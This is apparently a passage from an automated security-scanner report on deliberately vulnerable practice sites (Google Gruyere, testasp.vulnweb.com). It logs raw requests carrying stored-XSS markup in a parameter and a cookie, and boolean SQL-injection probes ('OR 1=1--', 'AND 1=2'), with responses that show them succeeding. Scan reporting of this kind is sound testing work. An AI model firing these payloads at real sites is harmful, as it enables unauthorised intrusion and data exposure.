      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: GRUYERE=37929950|<svg_onload=sentinel42()>||author; GRUYERE_ID=4798963173712273113451063736180807516
    RESPONSE 200
      cache-control: no-cache
      content-type: text/html
      pragma: no-cache
      set-cookie: GRUYERE=93319462|<iframe srcdoc=sentinel42()>||author; path=/479896317371227311345106373618080751617
      x-xss-protection: 0
      x-cloud-trace-context: 062b267b2d453dfc4690cd2b54348c71
      date: Sun, 04 Oct 2026 02:29:14 GMT
      server: Google Frontend
      content-length: 2224
      expires: Sun, 04 Oct 2026 02:29:14 GMT
      alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
      body[0:200]: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Copyright 2017 Google Inc. -->
<html>
<head>
<title>Gruyere: Error</title>
<style>
/* Copyright 2017 Google Inc. */

body, html, td
  - `finding` ref `F-85f0251945` excerpt: `canary markup submitted via the real form persisted server-side and rendered RAW on https://google-gruyere.appspot.com/4`
    finding: xss_stored GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile param=uid status=verified conf=0.9
      evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on https://google-gruyere.appspot.com/4798963173712273113451063736180
      evidence[stored_xss_surfaces]: render surfaces: https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile | https://google-gruyere.appspot.com/479896317
      verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2

**[ENTRY] — verified**

  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile — parameter uid

  - `finding` ref `F-85f0251945` excerpt: `canary markup submitted via the real form persisted server-side and rendered RAW on https://google-gruyere.appspot.com/4`
    finding: xss_stored GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile param=uid status=verified conf=0.9
      evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on https://google-gruyere.appspot.com/4798963173712273113451063736180
      evidence[stored_xss_surfaces]: render surfaces: https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile | https://google-gruyere.appspot.com/479896317
      verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2
  - `journal` ref `req-0518d7a0` excerpt: `https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile?action=new&uid=%3Ciframe+srcdoc%3`
    REQUEST  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile?action=new&uid=%3Ciframe+srcdoc%3Dsentinel42%28%29%3E&pw=&is_author=True
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: GRUYERE=37929950|<svg_onload=sentinel42()>||author; GRUYERE_ID=4798963173712273113451063736180807516
    RESPONSE 200
      cache-control: no-cache
      content-type: text/html
      pragma: no-cache
      set-cookie: GRUYERE=93319462|<iframe srcdoc=sentinel42()>||author; path=/479896317371227311345106373618080751617
      x-xss-protection: 0
      x-cloud-trace-context: 062b267b2d453dfc4690cd2b54348c71
      date: Sun, 04 Oct 2026 02:29:14 GMT
      server: Google Frontend
      content-length: 2224
      expires: Sun, 04 Oct 2026 02:29:14 GMT
      alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
      body[0:200]: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Copyright 2017 Google Inc. -->
<html>
<head>
<title>Gruyere: Error</title>
<style>
/* Copyright 2017 Google Inc. */

body, html, td

**[ACTION] — verified**

  canary markup submitted through the real form (all form fields ridden verbatim) and persisted server-side

  - `finding` ref `F-85f0251945` excerpt: `verification: re-test:fresh-canary-resubmit (passed=True)`
    finding: xss_stored GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile param=uid status=verified conf=0.9
      evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on https://google-gruyere.appspot.com/4798963173712273113451063736180
      evidence[stored_xss_surfaces]: render surfaces: https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile | https://google-gruyere.appspot.com/479896317
      verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2
  - `journal` ref `req-0518d7a0` excerpt: `https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile?action=new&uid=%3Ciframe+srcdoc%3`
    REQUEST  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile?action=new&uid=%3Ciframe+srcdoc%3Dsentinel42%28%29%3E&pw=&is_author=True
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: GRUYERE=37929950|<svg_onload=sentinel42()>||author; GRUYERE_ID=4798963173712273113451063736180807516
    RESPONSE 200
      cache-control: no-cache
      content-type: text/html
      pragma: no-cache
      set-cookie: GRUYERE=93319462|<iframe srcdoc=sentinel42()>||author; path=/479896317371227311345106373618080751617
      x-xss-protection: 0
      x-cloud-trace-context: 062b267b2d453dfc4690cd2b54348c71
      date: Sun, 04 Oct 2026 02:29:14 GMT
      server: Google Frontend
      content-length: 2224
      expires: Sun, 04 Oct 2026 02:29:14 GMT
      alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
      body[0:200]: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Copyright 2017 Google Inc. -->
<html>
<head>
<title>Gruyere: Error</title>
<style>
/* Copyright 2017 Google Inc. */

body, html, td

**[OBJECT] — verified**

  the persisted user record (the canary survived an independent re-fetch — the record exists server-side)

  - `finding` ref `F-85f0251945` excerpt: `canary markup submitted via the real form persisted server-side and rendered RAW on https://google-gruyere.appspot.com/4`
    finding: xss_stored GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile param=uid status=verified conf=0.9
      evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on https://google-gruyere.appspot.com/4798963173712273113451063736180
      evidence[stored_xss_surfaces]: render surfaces: https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile | https://google-gruyere.appspot.com/479896317
      verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2
  - `twin` ref `stats.digital_twin.entity_inventory` excerpt: `{"carried_by_params": 3, "consumed_by_steps": [], "entity": "User", "minted_by_steps": [], "surfaces": ["GET /4798963173`
    twin row: {"carried_by_params": 3, "consumed_by_steps": [], "entity": "User", "minted_by_steps": [], "surfaces": ["GET /4798963173

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted

  - `journal` ref `req-0518d7a0` excerpt: `GRUYERE=37929950|<svg_onload=sentinel42()>||author; GRUYERE_ID=479896317371227311345106373618080751617`
    REQUEST  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile?action=new&uid=%3Ciframe+srcdoc%3Dsentinel42%28%29%3E&pw=&is_author=True
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: GRUYERE=37929950|<svg_onload=sentinel42()>||author; GRUYERE_ID=4798963173712273113451063736180807516
    RESPONSE 200
      cache-control: no-cache
      content-type: text/html
      pragma: no-cache
      set-cookie: GRUYERE=93319462|<iframe srcdoc=sentinel42()>||author; path=/479896317371227311345106373618080751617
      x-xss-protection: 0
      x-cloud-trace-context: 062b267b2d453dfc4690cd2b54348c71
      date: Sun, 04 Oct 2026 02:29:14 GMT
      server: Google Frontend
      content-length: 2224
      expires: Sun, 04 Oct 2026 02:29:14 GMT
      alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
      body[0:200]: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Copyright 2017 Google Inc. -->
<html>
<head>
<title>Gruyere: Error</title>
<style>
/* Copyright 2017 Google Inc. */

body, html, td
  - `finding` ref `F-85f0251945` excerpt: `canary markup submitted via the real form persisted server-side and rendered RAW on https://google-gruyere.appspot.com/4`
    finding: xss_stored GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile param=uid status=verified conf=0.9
      evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on https://google-gruyere.appspot.com/4798963173712273113451063736180
      evidence[stored_xss_surfaces]: render surfaces: https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile | https://google-gruyere.appspot.com/479896317
      verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2

**[STATE] — verified**

  payload persisted server-side: the canary survived an independent re-fetch on the render surface (engine-observed reflection; the raw journal retains the re-fetch request — its bounded response window does not reach the marker location, so the marker observation is cited from the finding's evidence record)

  - `finding` ref `F-85f0251945` excerpt: `canary markup submitted via the real form persisted server-side and rendered RAW on https://google-gruyere.appspot.com/4`
    finding: xss_stored GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile param=uid status=verified conf=0.9
      evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on https://google-gruyere.appspot.com/4798963173712273113451063736180
      evidence[stored_xss_surfaces]: render surfaces: https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile | https://google-gruyere.appspot.com/479896317
      verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2
  - `journal` ref `req-0518d7a0` excerpt: `https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile?action=new&uid=%3Ciframe+srcdoc%3`
    REQUEST  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile?action=new&uid=%3Ciframe+srcdoc%3Dsentinel42%28%29%3E&pw=&is_author=True
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: GRUYERE=37929950|<svg_onload=sentinel42()>||author; GRUYERE_ID=4798963173712273113451063736180807516
    RESPONSE 200
      cache-control: no-cache
      content-type: text/html
      pragma: no-cache
      set-cookie: GRUYERE=93319462|<iframe srcdoc=sentinel42()>||author; path=/479896317371227311345106373618080751617
      x-xss-protection: 0
      x-cloud-trace-context: 062b267b2d453dfc4690cd2b54348c71
      date: Sun, 04 Oct 2026 02:29:14 GMT
      server: Google Frontend
      content-length: 2224
      expires: Sun, 04 Oct 2026 02:29:14 GMT
      alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
      body[0:200]: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Copyright 2017 Google Inc. -->
<html>
<head>
<title>Gruyere: Error</title>
<style>
/* Copyright 2017 Google Inc. */

body, html, td

**[IMPACT] — inferred**

  defect VERIFIED (canary markup submitted via the real form persisted server-side and rendered RAW on https:) but the end impact was NOT directly demonstrated (impact grade 'indicated') — the impact claim is inferred from the verified defect, not from an executed demonstration

  - `finding` ref `F-85f0251945` excerpt: `canary markup submitted via the real form persisted server-side and rendered RAW on https://google-gruyere.appspot.com/4`
    finding: xss_stored GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile param=uid status=verified conf=0.9
      evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on https://google-gruyere.appspot.com/4798963173712273113451063736180
      evidence[stored_xss_surfaces]: render surfaces: https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile | https://google-gruyere.appspot.com/479896317
      verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2

</details>


## testasp — http://testasp.vulnweb.com (run run-e2a9fe4450, scanner sentinel-core/4.3.0)

**L2 SOURCE (honesty note): fresh v4.3.0 live scan (run-e2a9fe4450, seed cb51ac55); attack paths REBUILT with the citation-integrity hotfix (rotating-cookie citation pairing) — identical to what the shipped pipeline now embeds via orchestrator.report()**

**6 paths: 6 VERIFIED / 0 INFERRED** (6 single-finding, 0 chains) — weak-link histogram: `{}`

Seeds used: `F-1b63b983d5, F-392b76b39c, F-513d590d27, F-5257ed42db, F-9e99b000d0, F-acb5de3e87`; non-seed findings (annotation-only classes): `{"F-04058b4108": "tech_banner_disclosure", "F-187b5cf543": "server_banner_disclosure", "F-1a7aa06d6a": "missing_security_headers", "F-209a67e1f2": "missing_security_headers", "F-4310d2499a": "tech_banner_disclosure", "F-43d2f36c8b": "missing_security_headers", "F-4856fafa49": "missing_security_headers", "F-4a2cfa5630": "tech_banner_disclosure", "F-4f71bddaba": "tech_banner_disclosure", "F-5440722fef": "tech_banner_disclosure", "F-65e03a86c8": "server_banner_disclosure", "F-67badf7cb6": "tech_banner_disclosure", "F-77e7f10ede": "server_banner_disclosure", "F-7a32e4f1cc": "missing_security_headers", "F-965885cc53": "tech_banner_disclosure", "F-a027d42fd2": "server_banner_disclosure", "F-a058c9566f": "server_banner_disclosure", "F-af864c753b": "missing_security_headers", "F-afed445baf": "tech_banner_disclosure", "F-b74318d987": "server_banner_disclosure", "F-d8a40390d7": "tech_banner_disclosure", "F-df16bc8fd5": "missing_security_headers", "F-e399196a4b": "server_banner_disclosure", "F-f175595947": "missing_security_headers", "F-f242e852a0": "missing_security_headers", "F-f75e311a27": "server_banner_disclosure", "F-f8141ce6a3": "server_banner_disclosure"}`


### AP-20c4d8c901 — VERIFIED — sql_injection at /showthread.asp — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-5257ed42db | chain_rule: — | mitigations absent: []

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie ASPSESSIONIDAABRTDSA carried by the raw proving requests; issued by the target on response req-1a16cfe2 (an unauthenticated fetch of a public surface); no Authorization/credential material  |
| **entry** | verified | GET http://testasp.vulnweb.com/showthread.asp — parameter id |
| **action** | verified | boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes |
| **object** | verified | the SQL query evaluation (a read-capable oracle) |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted |
| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
| **impact** | verified | Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was de |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie ASPSESSIONIDAABRTDSA carried by the raw proving requests; issued by the target on response req-1a16cfe2 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request

  - `journal` ref `req-f3d15898` excerpt: `ASPSESSIONID=[REDACTED]`
    REQUEST  GET http://testasp.vulnweb.com/showthread.asp?id=3%27+OR+1%3D1--
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: ASPSESSIONID=[REDACTED]
    RESPONSE 500
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:36:03 GMT
      content-length: 1208
      body[0:200]: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" cont
  - `journal` ref `req-1a16cfe2` excerpt: `ASPSESSIONID=[REDACTED]; path=/`
    REQUEST  GET http://testasp.vulnweb.com
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      set-cookie: ASPSESSIONID=[REDACTED]; path=/
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:30:52 GMT
      content-length: 3542
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f
  - `finding` ref `F-5257ed42db` excerpt: `TRUE probe -> HTTP 200 (4197B), FALSE probe -> HTTP 500 (1208B) — boolean oracle`
    finding: sql_injection GET http://testasp.vulnweb.com/showthread.asp param=id status=verified conf=0.95
      evidence[response_diff]: TRUE probe -> HTTP 200 (4197B), FALSE probe -> HTTP 500 (1208B) — boolean oracle
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

**[ENTRY] — verified**

  GET http://testasp.vulnweb.com/showthread.asp — parameter id

  - `finding` ref `F-5257ed42db` excerpt: `TRUE probe -> HTTP 200 (4197B), FALSE probe -> HTTP 500 (1208B) — boolean oracle`
    finding: sql_injection GET http://testasp.vulnweb.com/showthread.asp param=id status=verified conf=0.95
      evidence[response_diff]: TRUE probe -> HTTP 200 (4197B), FALSE probe -> HTTP 500 (1208B) — boolean oracle
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2
  - `journal` ref `req-37328cc4` excerpt: `http://testasp.vulnweb.com/showthread.asp?id=3+AND+1%3D1`
    REQUEST  GET http://testasp.vulnweb.com/showthread.asp?id=3+AND+1%3D1
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: ASPSESSIONID=[REDACTED]
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:36:02 GMT
      content-length: 4197
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f

**[ACTION] — verified**

  boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes

  - `finding` ref `F-5257ed42db` excerpt: `verification: oracle:replay-2round (passed=True)`
    finding: sql_injection GET http://testasp.vulnweb.com/showthread.asp param=id status=verified conf=0.95
      evidence[response_diff]: TRUE probe -> HTTP 200 (4197B), FALSE probe -> HTTP 500 (1208B) — boolean oracle
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2
  - `journal` ref `req-37328cc4` excerpt: `http://testasp.vulnweb.com/showthread.asp?id=3+AND+1%3D1`
    REQUEST  GET http://testasp.vulnweb.com/showthread.asp?id=3+AND+1%3D1
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: ASPSESSIONID=[REDACTED]
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:36:02 GMT
      content-length: 4197
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f

**[OBJECT] — verified**

  the SQL query evaluation (a read-capable oracle)

  - `finding` ref `F-5257ed42db` excerpt: `TRUE probe -> HTTP 200 (4197B), FALSE probe -> HTTP 500 (1208B) — boolean oracle`
    finding: sql_injection GET http://testasp.vulnweb.com/showthread.asp param=id status=verified conf=0.95
      evidence[response_diff]: TRUE probe -> HTTP 200 (4197B), FALSE probe -> HTTP 500 (1208B) — boolean oracle
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted

  - `journal` ref `req-37328cc4` excerpt: `ASPSESSIONID=[REDACTED]`
    REQUEST  GET http://testasp.vulnweb.com/showthread.asp?id=3+AND+1%3D1
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: ASPSESSIONID=[REDACTED]
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:36:02 GMT
      content-length: 4197
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f
  - `finding` ref `F-5257ed42db` excerpt: `TRUE probe -> HTTP 200 (4197B), FALSE probe -> HTTP 500 (1208B) — boolean oracle`
    finding: sql_injection GET http://testasp.vulnweb.com/showthread.asp param=id status=verified conf=0.95
      evidence[response_diff]: TRUE probe -> HTTP 200 (4197B), FALSE probe -> HTTP 500 (1208B) — boolean oracle
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

**[STATE] — verified**

  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested

  - `finding` ref `F-5257ed42db` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
    finding: sql_injection GET http://testasp.vulnweb.com/showthread.asp param=id status=verified conf=0.95
      evidence[response_diff]: TRUE probe -> HTTP 200 (4197B), FALSE probe -> HTTP 500 (1208B) — boolean oracle
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

**[IMPACT] — verified**

  Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was demonstrated, not exercised.

  - `finding` ref `F-5257ed42db` excerpt: `impact grade=proven; chain: oracle:replay-2round on GET http://testasp.vulnweb.com/showthread.asp`
    finding: sql_injection GET http://testasp.vulnweb.com/showthread.asp param=id status=verified conf=0.95
      evidence[response_diff]: TRUE probe -> HTTP 200 (4197B), FALSE probe -> HTTP 500 (1208B) — boolean oracle
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

</details>


### AP-2c4a82740d — VERIFIED — sql_injection at /showforum.asp — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-392b76b39c | chain_rule: — | mitigations absent: []

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie ASPSESSIONIDAABRTDSA carried by the raw proving requests; issued by the target on response req-1a16cfe2 (an unauthenticated fetch of a public surface); no Authorization/credential material  |
| **entry** | verified | GET http://testasp.vulnweb.com/showforum.asp — parameter id |
| **action** | verified | boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes |
| **object** | verified | the SQL query evaluation (a read-capable oracle) |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted |
| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
| **impact** | verified | Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was de |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie ASPSESSIONIDAABRTDSA carried by the raw proving requests; issued by the target on response req-1a16cfe2 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request

  - `journal` ref `req-e9090833` excerpt: `ASPSESSIONID=[REDACTED]`
    REQUEST  GET http://testasp.vulnweb.com/showforum.asp?id=2%27+OR+1%3D2--
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: ASPSESSIONID=[REDACTED]
    RESPONSE 500
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:32:21 GMT
      content-length: 1208
      body[0:200]: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" cont
  - `journal` ref `req-1a16cfe2` excerpt: `ASPSESSIONID=[REDACTED]; path=/`
    REQUEST  GET http://testasp.vulnweb.com
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
    RESPONSE 200
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      set-cookie: ASPSESSIONID=[REDACTED]; path=/
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:30:52 GMT
      content-length: 3542
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="f
  - `finding` ref `F-392b76b39c` excerpt: `TRUE probe -> HTTP 200 (2965B), FALSE probe -> HTTP 500 (1208B) — boolean oracle`
    finding: sql_injection GET http://testasp.vulnweb.com/showforum.asp param=id status=verified conf=0.95
      evidence[response_diff]: TRUE probe -> HTTP 200 (2965B), FALSE probe -> HTTP 500 (1208B) — boolean oracle
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

**[ENTRY] — verified**

  GET http://testasp.vulnweb.com/showforum.asp — parameter id

  - `finding` ref `F-392b76b39c` excerpt: `TRUE probe -> HTTP 200 (2965B), FALSE probe -> HTTP 500 (1208B) — boolean oracle`
    finding: sql_injection GET http://testasp.vulnweb.com/showforum.asp param=id status=verified conf=0.95
      evidence[response_diff]: TRUE probe -> HTTP 200 (2965B), FALSE probe -> HTTP 500 (1208B) — boolean oracle
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2
  - `journal` ref `req-01066100` excerpt: `http://testasp.vulnweb.com/showforum.asp?id=2+AND+1%3D2`
    REQUEST  GET http://testasp.vulnweb.com/showforum.asp?id=2+AND+1%3D2
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: ASPSESSIONID=[REDACTED]
    RESPONSE 500
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:32:20 GMT
      content-length: 1208
      body[0:200]: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" cont

**[ACTION] — verified**

  boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes

  - `finding` ref `F-392b76b39c` excerpt: `verification: oracle:replay-2round (passed=True)`
    finding: sql_injection GET http://testasp.vulnweb.com/showforum.asp param=id status=verified conf=0.95
      evidence[response_diff]: TRUE probe -> HTTP 200 (2965B), FALSE probe -> HTTP 500 (1208B) — boolean oracle
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2
  - `journal` ref `req-01066100` excerpt: `http://testasp.vulnweb.com/showforum.asp?id=2+AND+1%3D2`
    REQUEST  GET http://testasp.vulnweb.com/showforum.asp?id=2+AND+1%3D2
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: ASPSESSIONID=[REDACTED]
    RESPONSE 500
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:32:20 GMT
      content-length: 1208
      body[0:200]: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" cont

**[OBJECT] — verified**

  the SQL query evaluation (a read-capable oracle)

  - `finding` ref `F-392b76b39c` excerpt: `TRUE probe -> HTTP 200 (2965B), FALSE probe -> HTTP 500 (1208B) — boolean oracle`
    finding: sql_injection GET http://testasp.vulnweb.com/showforum.asp param=id status=verified conf=0.95
      evidence[response_diff]: TRUE probe -> HTTP 200 (2965B), FALSE probe -> HTTP 500 (1208B) — boolean oracle
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted

  - `journal` ref `req-01066100` excerpt: `ASPSESSIONID=[REDACTED]`
    REQUEST  GET http://testasp.vulnweb.com/showforum.asp?id=2+AND+1%3D2
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: ASPSESSIONID=[REDACTED]
    RESPONSE 500
      cache-control: private
      content-type: text/html
      server: Microsoft-IIS/8.5
      x-powered-by: ASP.NET
      date: Sun, 04 Oct 2026 02:32:20 GMT
      content-length: 1208
      body[0:200]: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" cont
  - `finding` ref `F-392b76b39c` excerpt: `TRUE probe -> HTTP 200 (2965B), FALSE probe -> HTTP 500 (1208B) — boolean oracle`
    finding: sql_injection GET http://testasp.vulnweb.com/showforum.asp param=id status=verified conf=0.95
      evidence[response_diff]: TRUE probe -> HTTP 200 (2965B), FALSE probe -> HTTP 500 (1208B) — boolean oracle
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

**[STATE] — verified**

  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested

  - `finding` ref `F-392b76b39c` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
    finding: sql_injection GET http://testasp.vulnweb.com/showforum.asp param=id status=verified conf=0.95
      evidence[response_diff]: TRUE probe -> HTTP 200 (2965B), FALSE probe -> HTTP 500 (1208B) — boolean oracle
